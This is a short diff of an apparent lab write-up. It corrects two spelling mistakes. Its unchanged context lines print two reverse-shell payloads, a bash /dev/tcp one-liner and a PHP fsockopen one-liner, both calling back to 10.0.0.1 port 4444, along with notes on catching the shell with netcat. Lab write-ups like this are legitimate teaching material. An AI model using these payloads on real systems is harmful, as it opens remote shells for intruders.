@@ -71,7 +71,7 @@ The payload we put with ful path
 ```bash
 /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
 ```
-(This payload did not work on tht lab)
+(This payload did not work on that lab)
 
 Open a net cat server
 
@@ -92,7 +92,7 @@ Reverse shell php payload
 ```bash
 php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
-The page is hung while loading it is a good sign, usually u will get a shell on net cat if that happens
+The page is hung while loading it is a good sign, usually you will get a shell on net cat if that happens
 
 
 
